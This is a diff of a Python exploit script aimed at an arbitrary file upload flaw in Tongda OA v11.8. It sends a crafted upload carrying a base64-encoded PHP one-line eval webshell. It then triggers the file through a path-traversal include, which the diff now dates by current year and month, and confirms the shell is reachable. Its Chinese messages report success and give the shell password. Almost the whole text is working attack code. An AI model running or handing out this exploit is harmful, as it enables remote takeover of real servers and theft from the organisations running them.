@@ -2,13 +2,15 @@ import re
 import time
 import requests
 import urllib3
+import datetime
 from rich.console import Console
 
+
+now = datetime.datetime.now()
+now = now.strftime("%Y%m")[2:]
 console = Console()
 def now_time():
     return time.strftime("[%H:%M:%S] ", time.localtime())
-
-proxies={'http':'http://127.0.0.1:8080'}
 def main(target_url):
     if target_url[:4]!='http':
         target_url = 'http://' + target_url
@@ -26,17 +28,22 @@ def main(target_url):
 Content-Disposition: form-data; name="file"; filename="fb6790f4.json"
 Content-Type: application/octet-stream
  
-{"modular":"AllVariable","a":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIGV2YWwoJF9SRVFVRVNUWydhXSk7Pz4nKTs=","dataAnalysis":"{\"a\":\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\"}"}
+{"modular":"AllVariable","a":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJ2hlbGxvPD9waHAgZXZhbCgkX1JFUVVFU1RbJ2FdKTs/PicpOw==","dataAnalysis":"{\"a\":\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\"}"}
 --502f67681799b07e4de6b503655f5cae--'''
     data=data.encode("utf-8").decode("latin1")
     upload_url=target_url+'mobile/api/api.ali.php'
-    exp_url=target_url+'inc/package/work.php?id=../../../../../myoa/attach/approve_center/2210/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4'
+    exp_url=target_url+'inc/package/work.php?id=../../../../../myoa/attach/approve_center/{}/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4'.format(now)
     console.print(now_time() + " [INFO]     正在检测通达OA v11.8 api.ali.php 任意文件上传漏洞", style='bold blue')
     try:
         requests.packages.urllib3.disable_warnings()
         upload = requests.post(upload_url, headers=headers, data=data, verify=False)
+        shell=requests.get(exp_url,headers=headerx,verify=False)
         if upload.status_code == 200:
-            console.print(now_time() + ' [SUCCESS]  漏洞存在 上传webshell成功，请修改日期 包含并生成文件默认密码为a:{}'.format(exp_url), style='bold green')
+            if shell.status_code== 200 and 'hello' in shell.text:
+                console.print(now_time() + ' [SUCCESS]  漏洞存在并生成了一句话木马 包含并生成文件默认密码为a:{}'.format(exp_url), style='bold green')
+              
+            else:
+                console.print(now_time() + ' [WARNING]  通达OA v11.8 api.ali.php 任意文件上传成功，但访问木马失败', style='bold red ')
         else:
             console.print(now_time() + ' [WARNING]  通达OA v11.8 api.ali.php 任意文件上传漏洞不存在', style='bold red ')
     except:
